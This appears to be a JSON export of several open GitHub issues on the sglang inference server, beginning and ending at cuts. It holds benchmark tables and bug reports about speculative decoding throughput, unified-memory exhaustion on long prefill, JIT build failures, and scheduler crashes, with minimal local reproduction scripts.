EP_SIZE=8 \\\n  -e SPEC_ALGORITHM=dspark -e DSPARK_BLOCK_SIZE=6 \\\n  -e CHUNKED_PREFILL_SIZE=2048 \\\n  -v /ssd/DeepSeek-V4.1-Flash:/model \\\n  <sglang image>\n```\n\nEffective `server_args` (verified at runtime via `/get_server_info`):\n\n| Parameter | Value |\n|---|---|\n| `tp_size` / `ep_size` / `dp_size` | 8 / 8 / 1 |\n| `speculative_algorithm` | DSPARK, `speculative_dspark_block_size = 6` |\n| `chunked_prefill_size` | 2048 |\n| `context_length` | 1,048,576 |\n| `kv_cache_dtype` | `fp8_e4m3` |\n| `mem_fraction_static` | 0.72 |\n| `max_running_requests` | 16 |\n| `attention_backend` / `moe_runner_backend` | `dsv4` / `flashinfer_mxfp4` |\n| CUDA graph decode / prefill | full (max_bs 16) / **disabled** |\n\n**TP8/EP8 is not a preference — it is the only layout that starts** (see \"Topologies SGLang rejects\" below).\n\n## Measured throughput (cold, single stream, tokens from `usage`, not SSE chunk counts)\n\n128K cold prefill:\n\n| Config | tok/s |\n|---|---|\n| `chunked_prefill_size=2048` (production) | **6,853** |\n| same config re-run | 6,765 (−1.3%) |\n| flashmla prefill backend | 6,845 |\n| fused-MoE all-reduce | 6,828 |\n| `chunked_prefill_size=4096` | 6,301 |\n| `chunked_prefill_size=1024` | 6,012 |\n\n32K prompt: ≈7,196 tok/s. GPU util ≈87% at 220 W of 600 W → **communication-bound on PCIe**, not compute-bound. ~7K tok/s looks like the ceiling for this board without NVLink.\n\nRadix/prefix cache is the only large multiplier: cache-hit prefill **0.34 s for a 112K-token prefix ≈ 325K tok/s (≈39×)**.\n\nDecode (client path over SSH tunnel, production config): prose 93.9 tok/s, structured/JSON 134.1 tok/s, TTFT 143–169 ms.\n\n## DSPARK A/B (block_size=2, clean legs, each verified via `server_info` + acceptance length)\n\n| Prompt class | DSPARK ON | DSPARK OFF |\n|---|---|---|\n| prose | 76.5–78.9 tok/s | 36.4–36.5 tok/s |\n| structured | 120.3–120.5 tok/s | 36.5 tok/s |\n| `accept len` | 3.0 tokens/step | 1.0 |\n\nWith DSPARK off the model flattens to ~36.5 tok/s regardless of prompt class — speculation is the difference between usable and unusable latency on this hardware. Production ships `block_size=6` (structured ≈237–252 tok/s vs 120 at block 2).\n\n## Traps that cost us experiments (SGLang-specific)\n\n1. **`--enable-expert-parallel` is a vLLM flag** — SGLang takes `ep_size`; the vLLM spelling is rejected outright.\n2. **`docker run` must pass `TP_SIZE`/`DP_SIZE`/`EP_SIZE` explicitly.** Without `-e`, the container silently serves TP8 defaults and your \"new\" config never happens (we recorded a full sweep of false data this way before adding a config gate).\n3. **`ep_size ≤ tp_size`** or the MoE rank computation divides by zero: `moe_ep_rank = tp_rank % (tp_size // moe_dp_size) // (tp_size // moe_dp_size // ep_size)`.\n4. **DSPARK + DP attention requires `--enable-dp-lm-head`** — but is unreachable on this model anyway (next section).\n\n## Topologies SGLang rejects on this model\n\n| Attempt | Result |\n|---|---|\n| DP2 × TP4 (any EP) | `ValueError: V4.1 vision currently supports TP/EP without DP, CP, PP or MoE A2A` — both replicas die within ~70 s |\n| prefill context-parallel | same class of rejection |\n| `--enable-dp-attention` alone | silently no DP group (`dp_size: 1`) — looks fine, isn't |\n\nOther SM120 gaps we hit: MSCCL++ (`_tune` kernel crash), FlashInfer all-reduce fusion, `flashmla_sparse_q8`, and CUDA-graph capture for **prefill** (crashes even with DSPARK off, i.e. unrelated to speculation).\n\n## Operational notes\n\n- A defunct container can survive a single `docker rm -f`; the next `docker run` then fails on the name conflict while an orphaned engine process keeps the port and answers health checks — which silently mislabels the next experiment. Loop `docker rm -f` until the container is gone **and** nothing listens on the port.\n- A parse failure must never satisfy an \"expected config\" assertion, or a server that has not started yet gets recorded as \"spec disabled\".\n- Verify intended config from the server (`/get_server_info`) before timing anything; discard legs that fail the gate rather than recording them.\n\n## Not established\n\nNo 24 h soak (numbers come from a working day of production use), block sizes 4/8/12 not re-measured with the fixed sweep tool, and >32K prefill/long-context degradation not characterised.","reactions":{"url":"https://api.github.com/repos/sgl-project/sglang/issues/40877/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/sgl-project/sglang/issues/40877/timeline","performed_via_github_app":null,"state_reason":null,"pinned_comment":null,"score":1.0},{"url":"https://api.github.com/repos/sgl-project/sglang/issues/36941","repository_url":"https://api.github.com/repos/sgl-project/sglang","labels_url":"https://api.github.com/repos/sgl-project/sglang/issues/36941/labels{/name}","comments_url":"https://api.github.com/repos/sgl-project/sglang/issues/36941/comments","events_url":"https://api.github.com/repos/sgl-project/sglang/issues/36941/events","html_url":"https://github.com/sgl-project/sglang/issues/36941","id":5283893098,"node_id":"I_kwDOLCAjRs8AAAABOvHPag","number":36941,"title":"[GB10] Long prefill (>40k tokens) exhausts unified memory and silently kills the worker rank — no traceback, no OOM record; cross-stack control passes at 54k","user":{"login":"beastllama","id":108938230,"node_id":"U_kgDOBn5D9g","avatar_url":"https://avatars.githubusercontent.com/u/108938230?v=4","gravatar_id":"","url":"https://api.github.com/users/beastllama","html_url":"https://github.com/beastllama","followers_url":"https://api.github.com/users/beastllama/followers","following_url":"https://api.github.com/users/beastllama/following{/other_user}","gists_url":"https://api.github.com/users/beastllama/gists{/gist_id}","starred_url":"https://api.github.com/users/beastllama/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/beastllama/subscriptions","organizations_url":"https://api.github.com/users/beastllama/orgs","repos_url":"https://api.github.com/users/beastllama/repos","events_url":"https://api.github.com/users/beastllama/events{/privacy}","received_events_url":"https://api.github.com/users/beastllama/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[],"state":"open","locked":false,"assignees":[],"milestone":null,"comments":5,"created_at":"2026-08-29T02:09:22Z","updated_at":"2026-10-17T13:07:19Z","closed_at":null,"assignee":null,"author_association":"NONE","issue_field_values":[],"type":null,"active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"## Summary\nOn 2x DGX Spark (GB10, sm_121, TP=2, 121.7 GB unified memory per node), GLM-5.3-Flash prefills above roughly 40k tokens drive **host/unified memory on the worker node to its ceiling**, and somewhere between 54k and 62k tokens the worker rank dies with no traceback, no CUDA error, and no OOM record. The head then hangs on a collective and self-terminates.\n\nThis is chunked prefill (`--chunked-prefill-size 8192`), so per-step token counts are bounded — but measured memory grows with **total prompt length**, not chunk size, which suggests something in the prefill path retains per-token state across chunks.\n\n## Measured\nConfig: SGLang @ `xinyuan/glm-5.3-flash-support` (aa8c950a3) + our fp8-KV patches (#36904), DFLASH speculative (D=5), `--kv-cache-dtype fp8_e4m3`, `--mem-fraction-static 0.92`, `--max-running-requests 8`, `--max-mamba-cache-size 40 --mamba-ssm-dtype bfloat16`, context 131072, KV pool 244,288 tokens.\n\nSingle request, needle-in-haystack prompt, `enable_thinking: false`, `max_tokens: 100`:\n\n| prompt tokens | result | worker host memory (spark-2, of 124.6 GB) |\n|---|---|---|\n| ~32k | PASS (recall correct) | not sampled |\n| ~40k | PASS but ~10 min wall (client timed out at 600 s; server kept generating) | **121.3 GB peak** |\n| ~62k (on a 262144-context variant, fraction 0.93) | **worker container gone**, head hung then killed itself | not sampled |\n\nHead-side symptom at the death:\n```\n[rank1] ProcessGroupNCCL ... Received a dump signal due to a collective timeout from rank 1\n[TP1] Scheduler hit an exception: RuntimeError: ... gloo/transport/tcp/pair.cc:537\n      Read error [10.10.10.1]:51085: Connection reset by peer\nReceived sigquit from a child process.\n```\nDocker reports `OOMKilled=false ExitCode=0 FinishedAt=0001-01-01T00:00:00Z` for the dead worker — i.e. the container's own state record is incoherent, consistent with the process being reaped outside docker's accounting rather than exiting.\n\nOnce the request is aborted and containers are removed, memory returns immediately (121.3 GB → 4.5 GB), so this is live allocation during prefill, not a leak that persists.\n\n## Cross-stack control on the SAME hardware, same night\nWe ran a different serving stack on these exact two nodes (vLLM-based, EXL3 4bpw weights, fp8 KV, DFlash2 drafter, MLA/drafter KV page-sharing): identical needle prompts at **34,840 and 54,040 tokens both PASSED**, worker alive, peak host memory 119.3 GB. So the hardware and the fabric sustain 54k-token prefills; the failure is specific to this serving path.\n\n## Why this may matter beyond our rig\nSilent worker death on long prefill has been reported independently on GB10 with a different quantization (NVFP4 KV, ~6k tokens) and was assumed to be quant-specific. Our data falsifies that scoping: it reproduces on fp8_e4m3 KV at a higher threshold, so prompt length looks like the governing variable, not KV dtype.\n\n## Asks\n1. Is any prefill-path buffer expected to scale with **total** sequence length rather than chunk size on the DSA/tilelang path (indexer top-k workspaces, sparse index buffers, radix bookkeeping)?\n2. Would a lower `--mem-fraction-static` plus smaller `--chunked-prefill-size` be the supported mitigation, or is there a bound we should be setting explicitly? (We are testing 2048/0.85 tonight and will post the result either way.)\n3. On unified-memory parts, is there an intended guard that fails the request instead of the process when host memory is exhausted? A request-level error would turn a node kill into a retry.\n\nHappy to run instrumented probes — we have the rig, the harness, and both stacks side by side.\n\nEnv: 2x DGX Spark GB10 (sm_121, aarch64), CUDA 13, TP=2/nnodes=2, dual-rail CX-7 RoCE, SGLang @ aa8c950a3 + PR #36904. Recipe/ladder: https://github.com/beastllama/GLM-5.3-Flash-DFlash2-SGLang-2x-DGX-Spark\nRelated: #36889 (mamba cap), #36904 (fp8 KV), #36548 (DFLASH concurrency correctness on GB10).\n","reactions":{"url":"https://api.github.com/repos/sgl-project/sglang/issues/36941/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/sgl-project/sglang/issues/36941/timeline","performed_via_github_app":null,"state_reason":null,"pinned_comment":null,"score":1.0},{"url":"https://api.github.com/repos/sgl-project/sglang/issues/44834","repository_url":"https://api.github.com/repos/sgl-project/sglang","labels_url":"https://api.github.com/repos/sgl-project/sglang/issues/44834/labels{/name}","comments_url":"https://api.github.com/repos/sgl-project/sglang/issues/44834/comments","events_url":"https://api.github.com/repos/sgl-project/sglang/issues/44834/events","html_url":"https://github.com/sgl-project/sglang/issues/44834","id":5894067322,"node_id":"I_kwDOLCAjRs8AAAABX1BUeg","number":44834,"title":"[Bug] `update_weights_from_disk` after `release_memory_occupation` is accepted and crashes the scheduler (segfault in `weight_loader`)","user":{"login":"Yunzez","id":56664264,"node_id":"MDQ6VXNlcjU2NjY0MjY0","avatar_url":"https://avatars.githubusercontent.com/u/56664264?v=4","gravatar_id":"","url":"https://api.github.com/users/Yunzez","html_url":"https://github.com/Yunzez","followers_url":"https://api.github.com/users/Yunzez/followers","following_url":"https://api.github.com/users/Yunzez/following{/other_user}","gists_url":"https://api.github.com/users/Yunzez/gists{/gist_id}","starred_url":"https://api.github.com/users/Yunzez/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/Yunzez/subscriptions","organizations_url":"https://api.github.com/users/Yunzez/orgs","repos_url":"https://api.github.com/users/Yunzez/repos","events_url":"https://api.github.com/users/Yunzez/events{/privacy}","received_events_url":"https://api.github.com/users/Yunzez/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[],"state":"open","locked":false,"assignees":[],"milestone":null,"comments":0,"created_at":"2026-10-17T02:42:00Z","updated_at":"2026-10-17T02:42:00Z","closed_at":null,"assignee":null,"author_association":"NONE","issue_field_values":[],"type":null,"active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"### Checklist\n\n- [x] I searched related issues but found no solution.\n- [x] The bug persists in the latest version.\n- [x] Issues without environment info and a minimal reproducible demo are hard to resolve and may receive no feedback.\n- [x] If this is not a bug report but a general question, please start a discussion at https://github.com/sgl-project/sglang/discussions. Otherwise, it will be closed.\n- [x] Please use English. Otherwise, it will be closed.\n\n### Describe the bug\n\nOn a server started with `--enable-memory-saver`, `POST /update_weights_from_disk` sent while memory is released (after\n`/release_memory_occupation`, before `/resume_memory_occupation`) is not rejected. The weights are loaded into the\nreleased allocation and the scheduler process dies:\n\n```\n[2026-10-16 01:48:42] INFO:     127.0.0.1:43408 - \"POST /release_memory_occupation HTTP/1.1\" 200 OK\n[2026-10-16 01:48:42] Update engine weights online from disk begin. avail mem=14.39 GB\nFatal Python error: Segmentation fault\n\nCurrent thread 0x00007f8b4549c000 (most recent call first):\n  File \".../sglang/srt/layers/vocab_parallel_embedding.py\", line 446 in weight_loader\n  File \".../sglang/srt/models/qwen3.py\", line 705 in load_weights\n  File \".../sglang/srt/model_loader/loader.py\", line 1075 in load_weights_only\n  File \".../sglang/srt/model_loader/loader.py\", line 1027 in load_weights_and_postprocess\n  File \".../sglang/srt/model_executor/model_runner_components/weight_updater.py\", line 217 in model_load_weights\n  File \".../sglang/srt/model_executor/model_runner_components/weight_updater.py\", line 227 in update_weights_from_disk\n  File \".../sglang/srt/managers/scheduler_components/weight_updater.py\", line 144 in update_weights_from_disk\n  ...\n```\n\nIn some runs the update returns `200` instead, and the first forward after `/resume_memory_occupation` fails with `ValueError: Pointer argument cannot be accessed from Triton (cpu tensor?)` -- the reloaded weights are not where the resumed model expects them. It does not happen when the update is sent before the release, or after the resume.\n\nWe first hit it as a race: an `update_weights_from_disk` was waiting on the model-update writer lock behind a running request, and a `release_memory_occupation` (which does not take that lock) arrived in between, so the update ran against released memory. The plain sequential form below is enough to reproduce it.\n\n\n\n### Reproduction\n\n\n\n```bash\npython -m sglang.launch_server --model-path Qwen/Qwen3-0.6B --port 30000 \\\n    --enable-memory-saver --max-total-tokens 6000 --max-running-requests 32\npython3 repro.py http://127.0.0.1:30000      # stdlib only\n```\n\n```python\n#!/usr/bin/env python3\n\"\"\"Minimal client: /update_weights_from_disk sent while memory is released (after /release_memory_occupation) is\naccepted, and the scheduler dies (segfault while loading the weights, or a Triton error on the first forward after\n/resume_memory_occupation).\n\nServer (SGLang main):\n    python -m sglang.launch_server --model-path Qwen/Qwen3-0.6B --port 30000 --enable-memory-saver \\\n        --max-total-tokens 6000 --max-running-requests 32\n\nRun:  python3 repro_issue.py http://127.0.0.1:30000      (stdlib only)\nSteps: release memory -> update weights from the served checkpoint -> resume memory -> one /generate -> /health.\nExit 1 when the server dies.\n\"\"\"\nimport json\nimport sys\nimport time\nimport urllib.error\nimport urllib.request\n\nBASE = sys.argv[1] if len(sys.argv) > 1 else \"http://127.0.0.1:30000\"\n\n\ndef call(method, path, body=None, timeout=300):\n    data = None if body is None else json.dumps(body).encode()\n    req = urllib.request.Request(BASE + path, data, {\"Content-Type\": \"application/json\"}, method=method)\n    try:\n        with urllib.request.urlopen(req, timeout=timeout) as r:\n            return r.status, r.read().decode(errors=\"replace\")[:200]\n    except urllib.error.HTTPError as e:\n        return e.code, e.read().decode(errors=\"replace\")[:200]\n    except Exception as e:  # connection refused / reset: the server is gone\n        return type(e).__name__, \"\"\n\n\ndef alive():\n    try:\n        with urllib.request.urlopen(BASE + \"/health\", timeout=5) as r:\n            return r.status == 200\n    except Exception:\n        return False\n\n\ndef main():\n    info = urllib.request.urlopen(BASE + \"/get_server_info\", timeout=30).read()\n    model_path = json.loads(info)[\"model_path\"]\n    print(\"generate before:\", call(\"POST\", \"/generate\", {\"text\": \"Hello\", \"sampling_params\": {\"max_new_tokens\": 8}})[0])\n    print(\"release:        \", call(\"POST\", \"/release_memory_occupation\", {}))\n    print(\"update:         \", call(\"POST\", \"/update_weights_from_disk\", {\"model_path\": model_path}))\n    print(\"resume:         \", call(\"POST\", \"/resume_memory_occupation\", {}))\n    print(\"generate after: \", call(\"POST\", \"/generate\", {\"text\": \"Hello\", \"sampling_params\": {\"max_new_tokens\": 8}}))\n    time.sleep(2)\n    up = alive()\n    print(\"server\", \"alive\" if up else \"DOWN\")\n    return 0 if up else 1\n\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n```\n\nOutput of three fresh servers in a row (RTX A4000, on main 7224fce1b5), each server log ending in the segfault above:\n\n```\ngenerate before: 200\nrelease:         (200, 'null')\nupdate:          ('RemoteDisconnected', '')\nresume:          ('URLError', '')\ngenerate after:  ('URLError', '')\nserver DOWN\n```\n\nRate, 10 trials per cell, server restarted after each death:\n\n| sequence | deaths |\n|---|---|\n| release, then update 0 / 5 / 20 / 100 / 500 ms later | 10/10 each (50/50) |\n| idle server: update, then pause(abort) + release right away | 3/10 |\n| running request: update, then pause (abort or retract), then release | 0/50 each |\n\nOver all deaths in these runs: 61 segfaults in `weight_loader`, 43 Triton `cpu tensor?` errors after resume.\n\n**Possible cause, assisted by Claude**\n\n1. `release_memory_occupation` pauses the memory-saver regions (weights and KV cache) but does not mark the engine as unable to load weights.\n2. `update_weights_from_disk` (`scheduler_components/weight_updater.py` ~144) does not check whether the weights are currently released, and goes straight to `model_runner.update_weights_from_disk` -> `load_weights`.\n3. The model-update writer lock, which serialises updates against generation, is not taken by `release_memory_occupation`, so a queued update can also run after a release that arrived later.\n\n\n\n### Environment\n\n<details>\n<summary><code>python -m sglang.check_env</code></summary>\n\n```text\nPython: 3.12.3 (main, Apr 23 2024, 14:57:18) [GCC 11.4.1 20230605 (Red Hat 11.4.1-2)]\nCUDA available: True\nGPU 0: NVIDIA RTX A4000\nGPU 0 Compute Capability: 8.6\nCUDA_HOME: <venv>/lib/python3.12/site-packages/nvidia/cu13\nNVCC: Cuda compilation tools, release 13.0, V13.0.88\nCUDA Driver Version: 595.91.07\nPyTorch: 2.14.1+cu130\nsglang: 0.0.0.dev1+g7224fce1b\nsglang-kernel: 0.4.9\nflashinfer_python: 0.7.1\nflashinfer_cubin: Module Not Found\nflashinfer_jit_cache: Module Not Found\ntriton: 3.8.0\ntransformers: 5.19.0\ntorchao: Module Not Found\nnumpy: 2.3.5\naiohttp: 3.14.5\nfastapi: 0.143.0\nhuggingface_hub: 1.33.0\ninteregular: 0.3.3\nmodelscope: 1.40.2\norjson: 3.13.0\noutlines: 0.1.11\npackaging: 26.3\npsutil: 7.2.2\npydantic: 2.14.1\npython-multipart: 0.0.32\npyzmq: 27.2.0\nuvicorn: 0.54.0\nuvloop: 0.23.0\nvllm: Module Not Found\nxgrammar: 0.2.7\nopenai: 2.6.1\ntiktoken: 0.14.0\nanthropic: 1.13.0\nlitellm: Module Not Found\ntorchcodec: 0.17.0\nNVIDIA Topology: \n    GPU0    NIC0    CPU Affinity    NUMA Affinity    GPU NUMA ID\nGPU0     X     NODE    2-3,6-7    0        N/A\nNIC0    NODE     X                 \n\nLegend:\n\n  X    = Self\n  SYS  = Connection traversing PCIe as well as the SMP interconnect between NUMA nodes (e.g., QPI/UPI)\n  NODE = Connection traversing PCIe as well as the interconnect between PCIe Host Bridges within a NUMA node\n  PHB  = Connection traversing PCIe as well as a PCIe Host Bridge (typically the CPU)\n  PXB  = Connection traversing multiple PCIe bridges (without traversing the PCIe Host Bridge)\n  PIX  = Connection traversing at most a single PCIe bridge\n  NV#  = Connection traversing a bonded set of # NVLinks\n\nNIC Legend:\n\n  NIC0: mlx5_bond_0\n\n\nulimit soft: 1024\n```\n\n</details>","reactions":{"url":"https://api.github.com/repos/sgl-project/sglang/issues/44834/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/sgl-project/sglang/issues/44834/timeline","performed_via_github_app":null,"state_reason":null,"pinned_comment":null,"score":1.0},{"url":"https://api.github.com/repos/sgl-project/sglang/issues/43412","repository_url":"https://api.github.com/repos/sgl-project/sglang","labels_url":"https://api.github.com/repos/sgl-project/sglang/issues/43412/labels{/name}","comments_url":"https://api.github.com/repos/sgl-project/sglang/issues/43412/comments","events_url":"https://api.github.com/repos/sgl-project/sglang/issues/43412/events","html_url":"https://github.com/sgl-project/sglang/issues/43412","id":5783229232,"node_id":"I_kwDOLCAjRs8AAAABWLUTMA","number":43412,"title":"Speculative decoding crashes server on first non-greedy request: flashinfer verify-sampling op JIT fails (bundled cccl vs pip cu13 toolkit) and kills the process tree","user":{"login":"santanu20","id":14839102,"node_id":"MDQ6VXNlcjE0ODM5MTAy","avatar_url":"https://avatars.githubusercontent.com/u/14839102?v=4","gravatar_id":"","url":"https://api.github.com/users/santanu20","html_url":"https://github.com/santanu20","followers_url":"https://api.github.com/users/santanu20/followers","following_url":"https://api.github.com/users/santanu20/following{/other_user}","gists_url":"https://api.github.com/users/santanu20/gists{/gist_id}","starred_url":"https://api.github.com/users/santanu20/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/santanu20/subscriptions","organizations_url":"https://api.github.com/users/santanu20/orgs","repos_url":"https://api.github.com/users/santanu20/repos","events_url":"https://api.github.com/users/santanu20/events{/privacy}","received_events_url":"https://api.github.com/users/santanu20/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[],"state":"open","locked":false,"assignees":[],"milestone":null,"comments":5,"created_at":"2026-10-09T19:02:21Z","updated_at":"2026-10-16T20:35:32Z","closed_at":null,"assignee":null,"author_association":"NONE","issue_field_values":[],"type":null,"active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"### Description\n\nOn a pip-installed bundle (no system CUDA toolkit), enabling speculative decoding makes the server crash with SIGKILL on the **first non-greedy request**. Greedy (temperature 0) traffic works perfectly; any sampled request (e.g. temperature 0.7) dies.\n\nRoot cause chain (all observed live):\n\n1. Spec verify path `srt/speculative/eagle_utils.py:931 eagle_sample` calls `flashinfer.sampling.top_k_renorm_probs` (`sampling.py:1899`).\n2. That op has no prebuilt wheel coverage for this env, so flashinfer JIT-compiles it at request time (`flashinfer/jit/core.py:427 build` → ninja).\n3. The compile uses the pip `nvidia-cu13` nvcc (13.4.92) against flashinfer's **bundled cccl** headers and the pip cu13 includes; `cccl/libcudacxx/include/cuda/std/__cccl/cuda_toolkit.h:41` raises:\n   `#error \"CUDA compiler and CUDA toolkit headers are incompatible, please check your include paths\"`\n4. `RuntimeError: Ninja build failed` propagates as a scheduler exception → `kill_process_tree(include_parent=True)` → the whole server is SIGKILLed mid-request.\n\nThe same JIT defect also fires at startup graph capture with the default flashinfer attention backend when speculation is on (`--attention-backend triton` avoids that one), so the only fully working combination on this bundle is NGRAM/EAGLE + triton attention + greedy-only requests.\n\nAdditionally, the failed JIT leaves a partial build in the flashinfer cache dir (`.../flashinfer/0.6.18/89/cached_ops/sampling/`: `build.ninja` + one `.o`, no `.so`), and every subsequent spawn retries and fails the same way — the poisoned cache never recovers.\n\n### Reproduce\n\n1. venv: `sglang==0.5.21`, `torch==2.13.0+cu130`, `flashinfer==0.6.18`, pip `nvidia-cu13` wheels (nvcc `release 13.4, V13.4.92`), Python 3.12. GPU: RTX 4070 Laptop (sm_89), driver 595.99.02.\n2. `python -m sglang.launch_server --model-path <small model> --speculative-algorithm NGRAM --attention-backend triton` (server starts and serves fine).\n3. Send one chat completion with `\"temperature\": 0.7` → request hangs, scheduler raises, process tree SIGKILLed within seconds. `\"temperature\": 0` → 200 OK, output identical to dense decode.\n\nLogs (trimmed to the decisive lines):\n\n```\n  File \".../sglang/srt/speculative/eagle_utils.py\", line 931, in eagle_sample\n    target_probs = top_k_renorm_prob(\n  File \".../flashinfer/sampling.py\", line 1899, in top_k_renorm_probs\n  File \".../flashinfer/jit/core.py\", line 427, in build\n    run_ninja(self.build_dir, self.ninja_path, verbose)\n  File \".../flashinfer/jit/cpp_ext.py\", line 382, in run_ninja\n    raise RuntimeError(msg) from e\nRuntimeError: Ninja build failed. Ninja output:\nFAILED: [code=1] .../nvidia/cu13/bin/nvcc ... -I.../flashinfer/data/cccl/cub -I.../flashinfer/data/cccl/libcudacxx/include ... -c .../flashinfer/data/csrc/sampling.cu\n.../flashinfer/data/cccl/libcudacxx/include/cuda/std/__cccl/cuda_toolkit.h:41:8: error: #error \"CUDA compiler and CUDA toolkit headers are incompatible, please check your include paths\"\n```\n\n### Expected behavior\n\n- The verify/sampling op either ships prebuilt for common envs, falls back to the pytorch sampling backend (`--sampling-backend pytorch` does not cover this internal path), or fails the request with a clear error — instead of JIT-compiling at first non-greedy request and taking the whole server down.\n- A sampling-op JIT failure should not be fatal to the server process tree.\n- The cccl-vs-toolkit include mismatch (bundled cccl + pip cu13 nvcc/includes) deserves a startup compat check: it turns every retry into the same crash.\n\n### Environment\n\n```\nsglang: 0.5.21 (pip)\ntorch: 2.13.0+cu130\nflashinfer: 0.6.18\nCUDA: pip nvidia-cu13 wheels, nvcc release 13.4 V13.4.92 (no system toolkit)\nGPU: RTX 4070 Laptop (sm_89), driver 595.99.02\nPython: 3.12, Linux\n```\n","reactions":{"url":"https://api.github.com/repos/sgl-project/sglang/issues/43412/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/sgl-project/sglang/issues/43412/timeline","performed_via_github_app":null,"state_reason":null,"pinned_comment":null,"score":1.0},{"url":"https://api.github.com/repos/sgl-project/sglang/issues/44745","repository_url":"https://api.github.com/repos/sgl-project/sglang","labels_url":"https://api.github.com/repos/sgl-project/sglang/issues/44745/labels{/name}","comments_url":"https://api.github.com/repos/sgl-project/sglang/issues/44745/comments","events_url":"https://api.github.com/repos/sgl-project/sglang/issues/44745/events","html_url":"https://github.com/sgl-project/sglang/issues/44745","id":5885007811,"node_id":"I_kwDOLCAjRs8AAAABXsYXww","number":44745,"title":"[Bug] When client disconnect with `pause_generation(mode=\"abort\")` and `release_memory_occupation` kills the scheduler","user":{"login":"Yunzez","id":56664264,"node_id":"MDQ6VXNlcjU2NjY0MjY0","avatar_url":"https://avatars.githubusercontent.com/u/56664264?v=4","gravatar_id":"","url":"https://api.github.com/users/Yunzez","html_url":"https://github.com/Yunzez","followers_url":"https://api.github.com/users/Yunzez/followers","following_url":"https://api.github.com/users/Yunzez/following{/other_user}","gists_url":"https://api.github.com/users/Yunzez/gists{/gist_id}","starred_url":"https://api.github.com/users/Yunzez/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/Yunzez/subscriptions","organizations_url":"https://api.github.com/users/Yunzez/orgs","repos_url":"https://api.github.com/users/Yunzez/repos","events_url":"https://api.github.com/users/Yunzez/events{/privacy}","received_events_url":"https://api.github.com/users/Yunzez/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[],"state":"open","locked":false,"assignees":[],"milestone":null,"comments":0,"created_at":"2026-10-16T13:29:08Z","updated_at":"2026-10-16T13:29:08Z","closed_at":null,"assignee":null,"author_association":"NONE","issue_field_values":[],"type":null,"active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"### Checklist\n\n- [x] I searched related issues but found no solution.\n- [x] The bug persists in the latest version.\n- [x] Issues without environment info and a minimal reproducible demo are hard to resolve and may receive no feedback.\n- [x] If this is not a bug report but a general question, please start a discussion at https://github.com/sgl-project/sglang/discussions. Otherwise, it will be closed.\n- [x] Please use English. Otherwise, it will be closed.\n\n### Describe the bug\n\nOn a server started with `--enable-memory-saver`, this sequence kills the scheduler:\n\n1. a streamed `/generate` is running and the client closes the connection (a disconnect);\n2. within about 1 ms, `POST /pause_generation {\"mode\": \"abort\"}` -- answered `200 \"Generation paused successfully.\"` in a few ms;\n3. `POST /release_memory_occupation {}` -- never answered; the connection is dropped and the server exits:\n\n```\n[2026-10-15 13:49:39] INFO:     127.0.0.1:32960 - \"POST /pause_generation HTTP/1.1\" 200 OK\n[2026-10-15 13:49:39] Scheduler hit an exception: Traceback (most recent call last):\n  ...\n  File \".../sglang/srt/managers/scheduler_components/weight_updater.py\", line 339, in release_memory_occupation assert self.is_fully_idle(\nAssertionError: release_memory_occupation should be called only when server is idle.\n[2026-10-15 13:49:39] SIGQUIT received. signum=None, frame=None. It usually means one child failed.\n```\n\nIt does **not** happen:\n* when the stream is still running (not disconnected) at the pause: 0/50 over release delays 0-100 ms;\n* when the pause comes 5 ms or more after the disconnect (n=1: 0/10 at 5, 10, 50, 300 ms);\n* with no request in flight (0/10).\n\n\n### Reproduction\n\nRun\n```bash\npython -m sglang.launch_server --model-path Qwen/Qwen3-0.6B --port 30000 \\\n    --enable-memory-saver --max-total-tokens 6000 --max-running-requests 32\npython3 repro.py http://127.0.0.1:30000      # stdlib only\n```\n\nBelow is the repro.py:\n```python\n#!/usr/bin/env python3\n\"\"\"Minimal client: a streamed request is disconnected, and right after that /pause_generation {\"mode\": \"abort\"} and\n/release_memory_occupation kill the SGLang scheduler.\n\nServer (SGLang main):\n    python -m sglang.launch_server --model-path Qwen/Qwen3-0.6B --port 30000 \\\n        --enable-memory-saver --max-total-tokens 6000 --max-running-requests 32\n\nRun:  python3 repro_issue.py http://127.0.0.1:30000      (stdlib only)\nEach trial streams a /generate, reads its first chunks, closes the connection (a client disconnect), waits DELAY ms,\npauses with mode=abort, releases memory, then resumes memory and continues generation. Exit 1 when the server dies.\n\"\"\"\nimport http.client\nimport json\nimport sys\nimport time\nimport urllib.error\nimport urllib.parse\nimport urllib.request\n\nBASE = sys.argv[1] if len(sys.argv) > 1 else \"http://127.0.0.1:30000\"\nHOST = urllib.parse.urlparse(BASE)\nDELAYS_MS = (0, 1) * 5\n\n\ndef post(path, body, timeout=30):\n    req = urllib.request.Request(BASE + path, json.dumps(body).encode(), {\"Content-Type\": \"application/json\"})\n    try:\n        with urllib.request.urlopen(req, timeout=timeout) as r:\n            return r.status\n    except 